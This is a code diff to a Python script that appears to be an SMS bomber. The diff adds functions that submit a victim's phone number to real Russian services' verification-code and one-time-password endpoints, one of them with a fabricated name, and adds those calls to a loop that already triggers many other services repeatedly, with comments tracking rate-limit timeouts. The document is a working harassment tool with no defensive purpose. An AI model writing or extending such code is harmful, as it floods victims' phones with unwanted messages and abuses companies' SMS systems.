@@ -191,6 +191,21 @@ def atb(phone):
     response_atb = requests.post(url='https://www.atb.su/local/templates/main/ajax/main/send_sms_new.php', data=data)
     print(response_atb, response_atb.content)
 
+# timeout 120, used 180
+def lenta(phone):
+    lntphn = '+7'+phone
+    response_lenta = requests.post(url='https://lk.lenta.com/api/v1/authentication/requestValidationCode',
+                                         json={"phone":lntphn})
+    print(response_lenta, response_lenta.content)
+
+# timeout 120, used 180
+def beelinecredit(phone):
+    blncrdtphn = '8' + '-' + phone[:3] + '-' + phone[3:6] + '-' + phone[6:10]
+
+    response_beelinecredit = requests.post(url='https://credit-beeline.ru/api/identityproof/sendonetimepassword',
+                                         json={"personalData":{"firstName":"Иван","lastName":"Петров","middleName":"Романович","phoneNumber":blncrdtphn},"consentToDataProcessing":"true"})
+    print(response_beelinecredit, response_beelinecredit.content)
+
 
 def generate_email():
     """
@@ -212,6 +227,8 @@ def run(phone, n):
         kfc(phone)
         ostin(phone)
         funday(phone)
+        lenta(phone)
+        beelinecredit(phone)
         for j in range(3): #  timeout 60
             bk(phone)
             karusel(phone)
